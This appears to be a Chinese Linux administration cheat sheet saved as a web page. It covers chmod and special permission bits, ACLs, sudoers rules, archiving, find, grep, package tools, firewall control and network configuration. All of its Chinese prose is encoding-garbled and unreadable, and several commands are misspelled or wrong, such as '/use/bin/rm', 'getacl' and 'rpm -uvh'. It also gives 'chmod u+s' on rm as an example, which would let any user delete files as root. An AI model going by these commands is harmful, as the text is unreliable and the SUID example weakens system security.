<h1 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h1><h2 id="æƒé™è¯´æ˜"><a href="#æƒé™è¯´æ˜" class="headerlink" title="æƒé™è¯´æ˜"></a>æƒé™è¯´æ˜</h2><p>æ–‡ä»¶æƒé™ç®€ä»‹ï¼šâ€™râ€™ ä»£è¡¨å¯è¯»ï¼ˆ4ï¼‰ï¼Œâ€™wâ€™ ä»£è¡¨å¯å†™ï¼ˆ2ï¼‰ï¼Œâ€™xâ€™ ä»£è¡¨æ‰§è¡Œæƒé™ï¼ˆ1ï¼‰ï¼Œæ‹¬å·å†…ä»£è¡¨â€8421æ³•â€<br>##æ–‡ä»¶æƒé™ä¿¡æ¯ç¤ºä¾‹ï¼š-rwxrw-râ€“<br>-ç¬¬ä¸€ä½ï¼šâ€™-â€˜å°±ä»£è¡¨æ˜¯æ–‡ä»¶ï¼Œâ€™dâ€™ä»£è¡¨æ˜¯æ–‡ä»¶å¤¹<br>-ç¬¬ä¸€ç»„ä¸‰ä½ï¼šæ‹¥æœ‰è€…çš„æƒé™<br>-ç¬¬äºŒç»„ä¸‰ä½ï¼šæ‹¥æœ‰è€…æ‰€åœ¨çš„ç»„ï¼Œç»„å‘˜çš„æƒé™<br>-ç¬¬ä¸‰ç»„ä¸‰ä½ï¼šä»£è¡¨çš„æ˜¯å…¶ä»–ç”¨æˆ·çš„æƒé™</p>
<h2 id="æ–‡ä»¶æƒé™-1"><a href="#æ–‡ä»¶æƒé™-1" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h2><p>æ™®é€šæˆæƒ    chmod +x a.txt </p>
<p>chmod a&#x3D;rwx a.txt<br>  8421æ³•     chmod 777 a.txt     &#x2F;&#x2F;1+2+4&#x3D;7ï¼Œâ€7â€è¯´æ˜æˆäºˆæ‰€æœ‰æƒé™</p>
<p>æ–‡ä»¶é»˜è®¤æœ€é«˜æƒé™ 666</p>
<p>ç›®å½•é»˜è®¤æœ€é«˜æƒé™777</p>
<p>æƒé™æ©ç umask 0022</p>
<p>æƒé™æ©ç è®¾ç½®ä¸º333æ—¶ï¼Œè®¡ç®—çš„é»˜è®¤æƒé™åº”ä¸º333ï¼Œå®é™…å´ä¸º444ï¼Œå› ä¸ºæ–‡ä»¶é»˜è®¤æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå¦‚æœä¸º333å¾—è¯åˆ™æ‹¥æœ‰äº†å¯æ‰§è¡Œæƒé™ï¼Œæ•…3+1å¾—åˆ°è¯»æƒé™</p>
<p><strong>SUID-setuid</strong></p>
<p>ä¸´æ—¶èµ‹äºˆå½“å‰ç”¨æˆ·å¯æ‰§è¡Œæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ã€‚</p>
<p>chmod u+s &#x2F;use&#x2F;bin&#x2F;rm</p>
<p><strong>SGID-setgid</strong></p>
<p>ä¸´æ—¶èµ‹äºˆå½“å‰ç”¨æˆ·å¯æ‰§è¡Œæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™</p>
<p>å…·æœ‰sgidæƒé™çš„ç›®å½•ä¸‹çš„æ–‡ä»¶çš„å±ç»„ç»§æ‰¿å…¶çˆ¶ç›®å½•çš„å±ç»„</p>
<p>chmod g+s &#x2F;tmp&#x2F;a</p>
<p><strong>stickybit ç²˜æ»ä½</strong></p>
<p>åœ¨è®¾ç½®äº†ç²˜æ»ä½çš„ç›®å½•ä¸‹é¢çš„æ–‡ä»¶ï¼Œåªæœ‰æ–‡ä»¶çš„å±ä¸»æˆ–è€…rootæ‰æ‹¥æœ‰åˆ é™¤çš„æƒé™</p>
<p>chmod o+t &#x2F;tmp&#x2F;a</p>
<p>ä¸€èˆ¬&#x2F;tmpé…ç½®æœ‰ç²˜æ»ä½</p>
<h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><p>setfacl -m u:armandhe:rwx a.txt &#x2F;&#x2F;ç»™ç”¨æˆ·armandheè®¾ç½®acl</p>
<p>setfacl -m m::rwx filename &#x2F;&#x2F;è®¾ç½®æ–‡ä»¶çš„æœ€å¤§æœ‰æ•ˆæƒé™ä¸ºrwx</p>
<p>setfacl -x u:armandhe:rw filename &#x2F;&#x2F;åˆ é™¤armandheçš„rwæƒé™</p>
<p>setfacl -x g:armandhe:rw filename &#x2F;&#x2F;åˆ é™¤ç»„armandheçš„rwæƒé™</p>
<p>setfacl -b a &#x2F;&#x2F;åˆ é™¤æ‰€æœ‰aclæƒé™</p>
<p>setfacl -m d:u:armandhe:rw dirname &#x2F;&#x2F;æŒ‡å®šé»˜è®¤aclæƒé™ï¼Œåªå¯¹ç›®å½•ç”Ÿæ•ˆï¼Œä»¥åæ–°å»ºçš„æ‰€æœ‰å­æ–‡ä»¶éƒ½ç»§æ‰¿è¯¥ç›®å½•çš„aclæƒé™ï¼Œåªé’ˆå¯¹æ–°å»ºçš„æ–‡ä»¶ç”Ÿæ•ˆ</p>
<p>setfacl -m u:armandhe:rwx -R&#x2F;tmp &#x2F;&#x2F;æŒ‡å®šé€’å½’aclæƒé™ï¼Œçˆ¶ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ç»§æ‰¿çˆ¶ç›®å½•çš„acl</p>
<p>getacl a.txt &#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶çš„aclä¿¡æ¯</p>
<p>mount &#x2F;&#x2F;æŸ¥çœ‹ç³»ç»ŸæŒ‚è½½ä¿¡æ¯</p>
<p>dumpe2fs -h åˆ†åŒº æŸ¥çœ‹æŒ‡å®šåˆ†åŒºæ–‡ä»¶ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</p>
<h2 id="ä¿®æ”¹ç”¨æˆ·ä½¿ç”¨å‘½ä»¤æƒé™æ‰§è¡Œç³»ç»Ÿæ“ä½œ"><a href="#ä¿®æ”¹ç”¨æˆ·ä½¿ç”¨å‘½ä»¤æƒé™æ‰§è¡Œç³»ç»Ÿæ“ä½œ" class="headerlink" title="ä¿®æ”¹ç”¨æˆ·ä½¿ç”¨å‘½ä»¤æƒé™æ‰§è¡Œç³»ç»Ÿæ“ä½œ"></a>ä¿®æ”¹ç”¨æˆ·ä½¿ç”¨å‘½ä»¤æƒé™æ‰§è¡Œç³»ç»Ÿæ“ä½œ</h2><p>æœ‰äº›å‘½ä»¤æ™®é€šç”¨æˆ·å¹¶æ²¡æœ‰æ‰§è¡Œçš„æƒé™ï¼Œé‚£ä¹ˆæ€ä¹ˆè®©æŸä¸€ä¸ªç”¨æˆ·æ‹¥æœ‰æ‰§è¡Œè¿™äº›å‘½ä»¤çš„æƒé™å‘¢ï¼Ÿ</p>
<p>ä¿®æ”¹&#x2F;etc&#x2F;sudoersæ–‡ä»¶æ¥èµ‹äºˆç”¨æˆ·æ“ä½œç³»ç»Ÿçš„æƒé™ï¼šå¯ä½¿ç”¨å‘½ä»¤visudo ç›´æ¥è·³åˆ°è¯¥æ–‡ä»¶ç¼–è¾‘</p>
<p>é…ç½®æ–‡ä»¶å†…å®¹ï¼š</p>
<p>root ALL&#x3D;(ALL)  ALL </p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°-ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªå‚æ•°-ç”¨æˆ·ä»å“ªå„¿ç™»å½•-ä¸»æœºIPåœ°å€&#x2F;prefixï¼Œç¬¬ä¸‰ä¸ªå‚æ•°-ä»¥ä»€ä¹ˆèº«ä»½è¿è¡Œï¼Œæœ€åä¸€ä¸ªå‚æ•°-å“ªäº›å‘½ä»¤-å‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡é€—å·åˆ†å‰²</p>
<p>è¿™æ ·ä¿®æ”¹å¤ªè¿‡éº»çƒ¦æš´åŠ›ï¼Œå¯ä»¥é€šè¿‡å°†ç”¨æˆ·åŠ å…¥åˆ°wheelç»„ä¸­æ¥å®ç°èµ‹äºˆæ™®é€šç”¨æˆ·ç³»ç»Ÿçº§æƒé™ã€‚</p>
<p>armandhe ALL&#x3D;(root) NOPASSWD:&#x2F;usr&#x2F;passwd [a-zA-z]* ,!&#x2F;usr&#x2F;passwd root &#x2F;&#x2F;ä¸éœ€è¦è¾“å…¥å½“å‰ç”¨æˆ·å¯†ç å³å¯æ‰§è¡Œpasswdå‘½ä»¤ ä¸å…è®¸ä¿®æ”¹rootç”¨æˆ·çš„å¯†ç </p>
<p>armandhe ALL&#x3D;(root) &#x2F;usr&#x2F;ifconfig,! &#x2F;usr&#x2F;ifconfig [a-zA-Z]* down &#x2F;&#x2F;å¯ä»¥æ›´æ”¹IPåœ°å€ï¼Œä¸å¯ä»¥å…³é—­ç½‘å¡</p>
<p>ä¿®æ”¹ä¹‹åï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·armandheï¼Œé€šè¿‡åœ¨å‘½ä»¤å‰é¢æ·»åŠ sudo æ¥è·å–rootç”¨æˆ·çš„æ‰§è¡Œæƒé™ã€‚</p>
<h1 id="æ‰“åŒ…ä¸è§£å‹"><a href="#æ‰“åŒ…ä¸è§£å‹" class="headerlink" title="æ‰“åŒ…ä¸è§£å‹"></a>æ‰“åŒ…ä¸è§£å‹</h1><h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>.zipã€.rar        &#x2F;&#x2F;windowsç³»ç»Ÿä¸­å‹ç¼©æ–‡ä»¶çš„æ‰©å±•å<br>.tar              &#x2F;&#x2F;Linuxä¸­æ‰“åŒ…æ–‡ä»¶çš„æ‰©å±•å<br>.gz               &#x2F;&#x2F;Linuxä¸­å‹ç¼©æ–‡ä»¶çš„æ‰©å±•å<br>.tar.gz           &#x2F;&#x2F;Linuxä¸­æ‰“åŒ…å¹¶å‹ç¼©æ–‡ä»¶çš„æ‰©å±•å</p>
<p>zcat compress_file &#x2F;&#x2F;æŸ¥çœ‹å‹ç¼©æ–‡ä»¶çš„å†…å®¹</p>
<p>gzip -d a.txt.gz &#x2F;&#x2F;è§£å‹</p>
<p>gzip -c a.txt &gt; a.txt.gz &#x2F;&#x2F;ä¿ç•™æºæ–‡ä»¶</p>
<p>tar -xf jack.txt.tar -C &#x2F;tmp&#x2F;  &#x2F;&#x2F;è§£å‹å¦å­˜ä¸º</p>
<p>tar -cft jack tar a.txt b.txt &#x2F;&#x2F; åˆ—å‡ºåŒ…ä¸­æ–‡ä»¶</p>
<h2 id="æ‰“åŒ…æ–‡ä»¶"><a href="#æ‰“åŒ…æ–‡ä»¶" class="headerlink" title="æ‰“åŒ…æ–‡ä»¶"></a>æ‰“åŒ…æ–‡ä»¶</h2><p>tar -zcvf æ‰“åŒ…å‹ç¼©åçš„æ–‡ä»¶å è¦æ‰“åŒ…çš„æ–‡ä»¶<br>  å‚æ•°è¯´æ˜ï¼šzï¼šè°ƒç”¨gzipå‹ç¼©å‘½ä»¤è¿›è¡Œå‹ç¼©; cï¼šæ‰“åŒ…æ–‡ä»¶; vï¼šæ˜¾ç¤ºè¿è¡Œè¿‡ç¨‹; fï¼šæŒ‡å®šæ–‡ä»¶å;<br>  ç¤ºä¾‹ï¼š<br> tar -zcvf a.tar file1 file2,â€¦      &#x2F;&#x2F;å¤šä¸ªæ–‡ä»¶å‹ç¼©æ‰“åŒ…</p>
<h2 id="è§£å‹æ–‡ä»¶"><a href="#è§£å‹æ–‡ä»¶" class="headerlink" title="è§£å‹æ–‡ä»¶"></a>è§£å‹æ–‡ä»¶</h2><p>tar -zxvf a.tar                      &#x2F;&#x2F;è§£åŒ…è‡³å½“å‰ç›®å½•<br>tar -zxvf a.tar -C &#x2F;usrâ€”â€”        &#x2F;&#x2F;æŒ‡å®šè§£å‹çš„ä½ç½®</p>
<p>zip <a href="http://a.txt.zip/">a.txt.zip</a> a.txt<br>unzip test.zip             &#x2F;&#x2F;è§£å‹*.zipæ–‡ä»¶<br>unzip -l test.zip          &#x2F;&#x2F;æŸ¥çœ‹*.zipæ–‡ä»¶çš„å†…å®¹</p>
<h1 id="å…¶ä»–å¸¸ç”¨å‘½ä»¤"><a href="#å…¶ä»–å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å…¶ä»–å¸¸ç”¨å‘½ä»¤"></a>å…¶ä»–å¸¸ç”¨å‘½ä»¤</h1><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find . -name â€œ*.câ€     &#x2F;&#x2F;å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰å»¶ä¼¸æ¡£åæ˜¯ c çš„æ–‡ä»¶åˆ—å‡ºæ¥<br>find . -type f         &#x2F;&#x2F;å°†ç›®å‰ç›®å½•å…¶å…¶ä¸‹å­ç›®å½•ä¸­æ‰€æœ‰ä¸€èˆ¬æ–‡ä»¶åˆ—å‡º<br>find . -ctime -20      &#x2F;&#x2F;å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æœ€è¿‘ 20 å¤©å†…æ›´æ–°è¿‡çš„æ–‡ä»¶åˆ—å‡º<br>find &#x2F;var&#x2F;log -type f -mtime +7 -ok rm {} ;     &#x2F;&#x2F;æŸ¥æ‰¾&#x2F;var&#x2F;logç›®å½•ä¸­æ›´æ”¹æ—¶é—´åœ¨7æ—¥ä»¥å‰çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åœ¨åˆ é™¤ä¹‹å‰è¯¢é—®å®ƒä»¬<br>find . -type f -perm 644 -exec ls -l {} ;       &#x2F;&#x2F;æŸ¥æ‰¾å‰ç›®å½•ä¸­æ–‡ä»¶å±ä¸»å…·æœ‰è¯»ã€å†™æƒé™ï¼Œå¹¶ä¸”æ–‡ä»¶æ‰€å±ç»„çš„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ–‡ä»¶<br>find &#x2F; -type f -size 0 -exec ls -l {} ;         &#x2F;&#x2F;ä¸ºäº†æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶é•¿åº¦ä¸º0çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åˆ—å‡ºå®ƒä»¬çš„å®Œæ•´è·¯å¾„</p>
<p>find &#x2F; -size +2M &#x2F;&#x2F;æŸ¥æ‰¾å¤§äºä¸¤å…†çš„æ–‡ä»¶</p>
<p>find &#x2F; -size -2K &#x2F;&#x2F;æŸ¥æ‰¾å°äº2kçš„æ–‡ä»¶</p>
<p>ls | xargs wc &#x2F;&#x2F;å°†å‰é¢çš„å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„å‚æ•°</p>
<h2 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h2><p>whereis ls &#x2F;&#x2F;å°†å’Œlsæ–‡ä»¶ç›¸å…³çš„æ–‡ä»¶éƒ½æŸ¥æ‰¾å‡ºæ¥ï¼Œå‘½ä»¤æ‰€åœ¨ç›®å½•ä»¥åŠæ‰‹å†Œæ‰€åœ¨ç›®å½•</p>
<h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><p>è¯´æ˜ï¼šwhichæŒ‡ä»¤ä¼šåœ¨ç¯å¢ƒå˜é‡$PATHè®¾ç½®çš„ç›®å½•é‡ŒæŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ã€‚<br>  which bash             &#x2F;&#x2F;æŸ¥çœ‹æŒ‡ä»¤â€bashâ€çš„ç»å¯¹è·¯å¾„</p>
<h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>è¯´æ˜ï¼šsudoå‘½ä»¤ä»¥ç³»ç»Ÿç®¡ç†è€…çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»ç”± sudo æ‰€æ‰§è¡Œçš„æŒ‡ä»¤å°±å¥½åƒæ˜¯ root äº²è‡ªæ‰§è¡Œã€‚éœ€è¦è¾“å…¥è‡ªå·±è´¦æˆ·å¯†ç ã€‚<br>ä½¿ç”¨æƒé™ï¼šåœ¨ &#x2F;etc&#x2F;sudoers ä¸­æœ‰å‡ºç°çš„ä½¿ç”¨è€…<br>sudo -l                              &#x2F;&#x2F;åˆ—å‡ºç›®å‰çš„æƒé™<br>$ sudo -u yao vi ~www&#x2F;index.html    &#x2F;&#x2F;ä»¥ yao ç”¨æˆ·èº«ä»½ç¼–è¾‘  home ç›®å½•ä¸‹wwwç›®å½•ä¸­çš„ index.html æ–‡ä»¶</p>
<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>grep -i â€œtheâ€  demo_file              &#x2F;&#x2F;åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²(ä¸åŒºåˆ†å¤§å°å†™)<br>grep -A 3 -i â€œexampleâ€  demo_text     &#x2F;&#x2F;è¾“å‡ºæˆåŠŸåŒ¹é…çš„è¡Œï¼Œä»¥åŠè¯¥è¡Œä¹‹åçš„ä¸‰è¡Œè‹<br>grep -r â€œrameshâ€  *                   &#x2F;&#x2F;åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­é€’å½’æŸ¥è¯¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„æ–‡ä»¶</p>
<p>grep -E &#x2F;&#x2F;ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼</p>
<p>grep -o &#x2F;&#x2F;è¾“å‡ºåŒ¹é…éƒ¨åˆ†</p>
<p>egrep &#x2F;&#x2F;æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼</p>
<p>grep -c &#x2F;&#x2F;è¾“å‡ºåŒ¹é…åˆ°çš„è¡Œ</p>
<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>è¯´æ˜ï¼šserviceå‘½ä»¤ç”¨äºè¿è¡ŒSystem V initè„šæœ¬ï¼Œè¿™äº›è„šæœ¬ä¸€èˆ¬ä½äº&#x2F;etc&#x2F;init.dæ–‡ä»¶ä¸‹ï¼Œè¿™ä¸ªå‘½ä»¤å¯ä»¥ç›´æ¥è¿è¡Œè¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢çš„è„šæœ¬ï¼Œè€Œä¸ç”¨åŠ ä¸Šè·¯å¾„<br>service ssh status      &#x2F;&#x2F;æŸ¥çœ‹æœåŠ¡çŠ¶æ€<br>service â€“status-all    &#x2F;&#x2F;æŸ¥çœ‹æ‰€æœ‰æœåŠ¡çŠ¶æ€<br>service ssh restart     &#x2F;&#x2F;é‡å¯æœåŠ¡</p>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>è¯´æ˜ï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºç³»ç»Ÿå½“å‰å†…å­˜çš„ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬å·²ç”¨å†…å­˜ã€å¯ç”¨å†…å­˜å’Œäº¤æ¢å†…å­˜çš„æƒ…å†µ<br>  free -g            &#x2F;&#x2F;ä»¥Gä¸ºå•ä½è¾“å‡ºå†…å­˜çš„ä½¿ç”¨é‡ï¼Œ-gä¸ºGBï¼Œ-mä¸ºMBï¼Œ-kä¸ºKBï¼Œ-bä¸ºå­—èŠ‚<br>  free -t            &#x2F;&#x2F;æŸ¥çœ‹æ‰€æœ‰å†…å­˜çš„æ±‡æ€»</p>
<p><code>free -s N //æ¯Nç§’æ‰“å°ä¸€æ¬¡</code></p>
<p><code>free -c  N  //æ‰“å°Næ¬¡ååœæ­¢</code></p>
<h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><p>top &#x2F;&#x2F;æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­å ç”¨èµ„æºæœ€å¤šçš„ä¸€äº›è¿›ç¨‹, shift+m æŒ‰ç…§å†…å­˜å¤§å°æŸ¥çœ‹</p>
<h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><p>è¯´æ˜ï¼šæ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ä½¿ç”¨æƒ…å†µ<br>  df -h            &#x2F;&#x2F;ä¸€ç§æ˜“çœ‹çš„æ˜¾ç¤º</p>
<h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>mount &#x2F;dev&#x2F;sdb1 &#x2F;u01              &#x2F;&#x2F;æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œç„¶åå°†è¿™ä¸ªæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°è¿™ä¸ªç›®å½•ä¸Š<br>dev&#x2F;sdb1 &#x2F;u01 ext2 defaults 0 2   &#x2F;&#x2F;æ·»åŠ åˆ°fstabä¸­è¿›è¡Œè‡ªåŠ¨æŒ‚è½½ï¼Œè¿™æ ·ä»»ä½•æ—¶å€™ç³»ç»Ÿé‡å¯çš„æ—¶å€™ï¼Œæ–‡ä»¶ç³»ç»Ÿéƒ½ä¼šè¢«åŠ è½½ 0æ˜¯å¦æ£€æŸ¥ 2è½¬æ¢</p>
<h2 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h2><p>è¯´æ˜ï¼šunameå¯ä»¥æ˜¾ç¤ºä¸€äº›é‡è¦çš„ç³»ç»Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å†…æ ¸åç§°ã€ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬å·ã€å¤„ç†å™¨ç±»å‹ä¹‹ç±»çš„ä¿¡æ¯<br>  uname -a</p>
<p>uname -r &#x2F;&#x2F;å†…æ ¸ç‰ˆæœ¬</p>
<p>uname -m &#x2F;&#x2F;æ¶æ„</p>
<p>uname -s &#x2F;&#x2F;è®¾å¤‡ç±»å‹</p>
<p>uname -o &#x2F;&#x2F;æ“ä½œç³»ç»Ÿ</p>
<p>unam -n &#x2F;&#x2F;nodeä¿¡æ¯ï¼Œç”¨æˆ·å</p>
<h2 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h2><p>è¯´æ˜ï¼šå®‰è£…æ’ä»¶å‘½ä»¤<br>  yum install httpd      &#x2F;&#x2F;ä½¿ç”¨yumå®‰è£…apache<br>  yum update httpd       &#x2F;&#x2F;æ›´æ–°apache<br>  yum remove httpd       &#x2F;&#x2F;å¸è½½&#x2F;åˆ é™¤apache</p>
<h2 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h2><p>è¯´æ˜ï¼šæ’ä»¶å®‰è£…å‘½ä»¤<br>rpm -ivh httpd-2.2.3-22.0.1.el5.i386.rpm      &#x2F;&#x2F;ä½¿ç”¨rpmæ–‡ä»¶å®‰è£…apache<br>rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      &#x2F;&#x2F;ä½¿ç”¨rpmæ›´æ–°apache<br>rpm -ev httpd                                 &#x2F;&#x2F;å¸è½½&#x2F;åˆ é™¤apache</p>
<h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>date -s â€œ01&#x2F;31&#x2F;2010 23:59:53â€ &#x2F;&#x2F;&#x2F;è®¾ç½®ç³»ç»Ÿæ—¶é—´</p>
<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>è¯´æ˜ï¼šä½¿ç”¨wgetä»ç½‘ä¸Šä¸‹è½½è½¯ä»¶ã€éŸ³ä¹ã€è§†é¢‘<br>ç¤ºä¾‹ï¼šwget <a href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</a><br>&#x2F;&#x2F;ä¸‹è½½æ–‡ä»¶å¹¶ä»¥æŒ‡å®šçš„æ–‡ä»¶åä¿å­˜æ–‡ä»¶<br>wget -O nagios.tar.gz <a href="http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz">http://prdownloads.sourceforge.net/sourceforge/nagios/nagios-3.2.1.tar.gz</a></p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp IP&#x2F;hostname    &#x2F;&#x2F;è®¿é—®ftpæœåŠ¡å™¨<br>mls *.html -       &#x2F;&#x2F;æ˜¾ç¤ºè¿œç¨‹ä¸»æœºä¸Šæ–‡ä»¶åˆ—è¡¨</p>
<h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><p>scp &#x2F;opt&#x2F;data.txt 192.168.1.101:&#x2F;opt&#x2F; <a href="https://å°†æœ¬åœ°optç›®å½•ä¸‹çš„dataæ–‡ä»¶å‘é€åˆ°192.168.1.101æœåŠ¡å™¨çš„optç›®å½•ä¸‹/">&#x2F;&#x2F;å°†æœ¬åœ°optç›®å½•ä¸‹çš„dataæ–‡ä»¶å‘é€åˆ°192.168.1.101æœåŠ¡å™¨çš„optç›®å½•ä¸‹</a>å®‰å…¨çš„æ‹·è´</p>
<h1 id="ç³»ç»Ÿç®¡ç†"><a href="#ç³»ç»Ÿç®¡ç†" class="headerlink" title="ç³»ç»Ÿç®¡ç†"></a>ç³»ç»Ÿç®¡ç†</h1><h2 id="é˜²ç«å¢™æ“ä½œ"><a href="#é˜²ç«å¢™æ“ä½œ" class="headerlink" title="é˜²ç«å¢™æ“ä½œ"></a>é˜²ç«å¢™æ“ä½œ</h2><p>service iptables status      &#x2F;&#x2F;æŸ¥çœ‹iptablesæœåŠ¡çš„çŠ¶æ€<br>service iptables start       &#x2F;&#x2F;å¼€å¯iptablesæœåŠ¡<br>service iptables stop        &#x2F;&#x2F;åœæ­¢iptablesæœåŠ¡<br>service iptables restart     &#x2F;&#x2F;é‡å¯iptablesæœåŠ¡<br>chkconfig iptables off       &#x2F;&#x2F;å…³é—­iptablesæœåŠ¡çš„å¼€æœºè‡ªå¯åŠ¨<br>chkconfig iptables on        &#x2F;&#x2F;å¼€å¯iptablesæœåŠ¡çš„å¼€æœºè‡ªå¯åŠ¨<br>##centos7 é˜²ç«å¢™æ“ä½œ<br>systemctl status firewalld.service     &#x2F;&#x2F;æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€<br>systemctl stop firewalld.service       &#x2F;&#x2F;å…³é—­è¿è¡Œçš„é˜²ç«å¢™<br>systemctl disable firewalld.service    &#x2F;&#x2F;æ°¸ä¹…ç¦æ­¢é˜²ç«å¢™æœåŠ¡<br>x</p>
<h2 id="ä¿®æ”¹ä¸»æœºå"><a href="#ä¿®æ”¹ä¸»æœºå" class="headerlink" title="ä¿®æ”¹ä¸»æœºå"></a>ä¿®æ”¹ä¸»æœºå</h2><p>hostnamectl set-hostname ä¸»æœºå</p>
<h2 id="æŸ¥çœ‹ip"><a href="#æŸ¥çœ‹ip" class="headerlink" title="æŸ¥çœ‹ip"></a>æŸ¥çœ‹ip</h2><p>ifconfig</p>
<h2 id="ä¿®æ”¹IP"><a href="#ä¿®æ”¹IP" class="headerlink" title="ä¿®æ”¹IP"></a>ä¿®æ”¹IP</h2><p>ä¿®æ”¹ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶åœ°å€ï¼š&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p>
<p>ä¸»è¦ä¿®æ”¹ä»¥ä¸‹é…ç½®ï¼š<br>TYPE&#x3D;Ethernet &#x2F;&#x2F;ç½‘ç»œç±»å‹<br>BOOTPROTO&#x3D;static &#x2F;&#x2F;é™æ€IP<br>DEVICE&#x3D;ens00 &#x2F;&#x2F;ç½‘å¡å<br>IPADDR&#x3D;192.168.1.100 &#x2F;&#x2F;è®¾ç½®çš„IP<br>NETMASK&#x3D;255.255.255.0 &#x2F;&#x2F;å­ç½‘æ©ç <br>GATEWAY&#x3D;192.168.1.1 &#x2F;&#x2F;ç½‘å…³<br>DNS1&#x3D;192.168.1.1 &#x2F;&#x2F;DNS<br>DNS2&#x3D;8.8.8.8 &#x2F;&#x2F;å¤‡ç”¨DNS<br>ONBOOT&#x3D;yes &#x2F;&#x2F;ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨æ­¤è®¾ç½®</p>
<p>ä¿®æ”¹ä¿å­˜ä»¥åä½¿ç”¨å‘½ä»¤é‡å¯ç½‘å¡ï¼šservice network restart</p>
<h2 id="é…ç½®æ˜ å°„"><a href="#é…ç½®æ˜ å°„" class="headerlink" title="é…ç½®æ˜ å°„"></a>é…ç½®æ˜ å°„</h2><p>ä¿®æ”¹æ–‡ä»¶ï¼š vi &#x2F;etc&#x2F;hosts<br>åœ¨æ–‡ä»¶æœ€åæ·»åŠ æ˜ å°„åœ°å€ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š<br>192.168.1.101  node1<br>192.168.1.102  node2<br>192.168.1.103  node3<br>é…ç½®å¥½ä»¥åä¿å­˜é€€å‡ºï¼Œè¾“å…¥å‘½ä»¤ï¼šping node1 ï¼Œå¯è§å®é™… ping çš„æ˜¯ 192.168.1.101ã€‚</p>
<h2 id="æŸ¥çœ‹è¿›ç¨‹"><a href="#æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹"></a>æŸ¥çœ‹è¿›ç¨‹</h2><p>ps -ef &#x2F;&#x2F;æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</p>
